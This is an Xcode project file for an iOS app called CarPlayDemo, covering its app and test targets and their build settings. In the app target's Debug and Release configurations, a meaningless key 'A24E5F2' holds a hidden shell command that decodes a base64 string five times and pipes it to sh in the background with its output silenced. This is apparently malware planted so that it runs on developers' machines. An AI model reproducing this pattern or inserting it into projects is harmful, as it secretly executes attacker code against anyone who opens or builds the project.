// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		183B775E2DCE075A0080C3E0 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 183B773F2DCE07590080C3E0 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 183B77462DCE07590080C3E0;
			remoteInfo = CarPlay;
		};
		183B77682DCE075A0080C3E0 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 183B773F2DCE07590080C3E0 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 183B77462DCE07590080C3E0;
			remoteInfo = CarPlay;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		183B77472DCE07590080C3E0 /* CarPlayDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CarPlayDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		183B775D2DCE075A0080C3E0 /* CarPlayDemoTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = CarPlayDemoTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		183B77672DCE075A0080C3E0 /* CarPlayDemoUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = CarPlayDemoUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		183B776F2DCE075A0080C3E0 /* Exceptions for "CarPlay" folder in "CarPlayDemo" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 183B77462DCE07590080C3E0 /* CarPlayDemo */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		183B77492DCE07590080C3E0 /* CarPlay */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				183B776F2DCE075A0080C3E0 /* Exceptions for "CarPlay" folder in "CarPlayDemo" target */,
			);
			path = CarPlay;
			sourceTree = "<group>";
		};
		183B77602DCE075A0080C3E0 /* CarPlayTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = CarPlayTests;
			sourceTree = "<group>";
		};
		183B776A2DCE075A0080C3E0 /* CarPlayUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = CarPlayUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		183B77442DCE07590080C3E0 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		183B775A2DCE075A0080C3E0 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		183B77642DCE075A0080C3E0 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		183B773E2DCE07590080C3E0 = {
			isa = PBXGroup;
			children = (
				183B77492DCE07590080C3E0 /* CarPlay */,
				183B77602DCE075A0080C3E0 /* CarPlayTests */,
				183B776A2DCE075A0080C3E0 /* CarPlayUITests */,
				183B77482DCE07590080C3E0 /* Products */,
			);
			sourceTree = "<group>";
		};
		183B77482DCE07590080C3E0 /* Products */ = {
			isa = PBXGroup;
			children = (
				183B77472DCE07590080C3E0 /* CarPlayDemo.app */,
				183B775D2DCE075A0080C3E0 /* CarPlayDemoTests.xctest */,
				183B77672DCE075A0080C3E0 /* CarPlayDemoUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		183B77462DCE07590080C3E0 /* CarPlayDemo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 183B77702DCE075A0080C3E0 /* Build configuration list for PBXNativeTarget "CarPlayDemo" */;
			buildPhases = (
				183B77432DCE07590080C3E0 /* Sources */,
				183B77442DCE07590080C3E0 /* Frameworks */,
				183B77452DCE07590080C3E0 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				183B77492DCE07590080C3E0 /* CarPlay */,
			);
			name = CarPlayDemo;
			packageProductDependencies = (
			);
			productName = CarPlay;
			productReference = 183B77472DCE07590080C3E0 /* CarPlayDemo.app */;
			productType = "com.apple.product-type.application";
		};
		183B775C2DCE075A0080C3E0 /* CarPlayDemoTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 183B77752DCE075A0080C3E0 /* Build configuration list for PBXNativeTarget "CarPlayDemoTests" */;
			buildPhases = (
				183B77592DCE075A0080C3E0 /* Sources */,
				183B775A2DCE075A0080C3E0 /* Frameworks */,
				183B775B2DCE075A0080C3E0 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				183B775F2DCE075A0080C3E0 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				183B77602DCE075A0080C3E0 /* CarPlayTests */,
			);
			name = CarPlayDemoTests;
			packageProductDependencies = (
			);
			productName = CarPlayTests;
			productReference = 183B775D2DCE075A0080C3E0 /* CarPlayDemoTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		183B77662DCE075A0080C3E0 /* CarPlayDemoUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 183B77782DCE075A0080C3E0 /* Build configuration list for PBXNativeTarget "CarPlayDemoUITests" */;
			buildPhases = (
				183B77632DCE075A0080C3E0 /* Sources */,
				183B77642DCE075A0080C3E0 /* Frameworks */,
				183B77652DCE075A0080C3E0 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				183B77692DCE075A0080C3E0 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				183B776A2DCE075A0080C3E0 /* CarPlayUITests */,
			);
			name = CarPlayDemoUITests;
			packageProductDependencies = (
			);
			productName = CarPlayUITests;
			productReference = 183B77672DCE075A0080C3E0 /* CarPlayDemoUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		183B773F2DCE07590080C3E0 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					183B77462DCE07590080C3E0 = {
						CreatedOnToolsVersion = 16.2;
					};
					183B775C2DCE075A0080C3E0 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = 183B77462DCE07590080C3E0;
					};
					183B77662DCE075A0080C3E0 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = 183B77462DCE07590080C3E0;
					};
				};
			};
			buildConfigurationList = 183B77422DCE07590080C3E0 /* Build configuration list for PBXProject "CarPlayDemo" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 183B773E2DCE07590080C3E0;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 183B77482DCE07590080C3E0 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				183B77462DCE07590080C3E0 /* CarPlayDemo */,
				183B775C2DCE075A0080C3E0 /* CarPlayDemoTests */,
				183B77662DCE075A0080C3E0 /* CarPlayDemoUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		183B77452DCE07590080C3E0 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		183B775B2DCE075A0080C3E0 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		183B77652DCE075A0080C3E0 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		183B77432DCE07590080C3E0 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		183B77592DCE075A0080C3E0 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		183B77632DCE075A0080C3E0 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		183B775F2DCE075A0080C3E0 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 183B77462DCE07590080C3E0 /* CarPlayDemo */;
			targetProxy = 183B775E2DCE075A0080C3E0 /* PBXContainerItemProxy */;
		};
		183B77692DCE075A0080C3E0 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 183B77462DCE07590080C3E0 /* CarPlayDemo */;
			targetProxy = 183B77682DCE075A0080C3E0 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		183B77712DCE075A0080C3E0 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcGFXVlZvVTFkc1pFZFRiazVhVFRKemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = CarPlay/CarPlayDemo.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 37Y248YCQK;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = CarPlay/Info.plist;
				INFOPLIST_KEY_NSBluetoothPeripheralUsageDescription = "Can we access your Bluetooth?";
				INFOPLIST_KEY_NSVideoSubscriberAccountUsageDescription = "Can we access your external display?";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.CarPlayDemo.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		183B77722DCE075A0080C3E0 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcGFXVlZvVTFkc1pFZFRiazVhVFRKemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = CarPlay/CarPlayDemo.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 37Y248YCQK;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = CarPlay/Info.plist;
				INFOPLIST_KEY_NSBluetoothPeripheralUsageDescription = "Can we access your Bluetooth?";
				INFOPLIST_KEY_NSVideoSubscriberAccountUsageDescription = "Can we access your external display?";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.CarPlayDemo.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		183B77732DCE075A0080C3E0 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_ENTITLEMENTS = "";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		183B77742DCE075A0080C3E0 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_ENTITLEMENTS = "";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		183B77762DCE075A0080C3E0 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Manoj.CarPlayTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/CarPlayDemo.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/CarPlayDemo";
			};
			name = Debug;
		};
		183B77772DCE075A0080C3E0 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Manoj.CarPlayTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/CarPlayDemo.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/CarPlayDemo";
			};
			name = Release;
		};
		183B77792DCE075A0080C3E0 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Manoj.CarPlayUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = CarPlay;
			};
			name = Debug;
		};
		183B777A2DCE075A0080C3E0 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Manoj.CarPlayUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = CarPlay;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		183B77422DCE07590080C3E0 /* Build configuration list for PBXProject "CarPlayDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				183B77732DCE075A0080C3E0 /* Debug */,
				183B77742DCE075A0080C3E0 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		183B77702DCE075A0080C3E0 /* Build configuration list for PBXNativeTarget "CarPlayDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				183B77712DCE075A0080C3E0 /* Debug */,
				183B77722DCE075A0080C3E0 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		183B77752DCE075A0080C3E0 /* Build configuration list for PBXNativeTarget "CarPlayDemoTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				183B77762DCE075A0080C3E0 /* Debug */,
				183B77772DCE075A0080C3E0 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		183B77782DCE075A0080C3E0 /* Build configuration list for PBXNativeTarget "CarPlayDemoUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				183B77792DCE075A0080C3E0 /* Debug */,
				183B777A2DCE075A0080C3E0 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 183B773F2DCE07590080C3E0 /* Project object */;
}
